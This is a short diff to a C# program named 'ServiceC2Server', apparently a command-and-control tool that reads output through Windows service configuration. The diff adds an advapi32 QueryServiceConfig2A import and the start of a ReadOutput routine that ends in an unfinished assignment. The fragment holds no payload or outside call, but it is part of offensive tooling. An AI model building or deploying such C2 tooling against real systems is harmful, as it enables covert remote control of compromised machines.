@@ -2,7 +2,6 @@
 using System.Management;
 using System.Runtime.InteropServices;
 
-
 namespace ServiceC2Server
 {
     internal class Program
@@ -37,7 +36,10 @@ namespace ServiceC2Server
 
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
-        
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern Boolean QueryServiceConfig2A(IntPtr hService, UInt32 dwInfoLevel, IntPtr buffer, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
+
         [DllImport("kernel32.dll")]
         static extern uint GetLastError();
 
@@ -151,6 +153,10 @@ namespace ServiceC2Server
         public static void ReadOutput(string serviceName)
         {
             Console.WriteLine("Waiting for output from " + serviceName);
+
+            IntPtr schService = Connect(serviceName);
+
+            IntPtr QueryServiceConfig2A = 
 
             try
             {
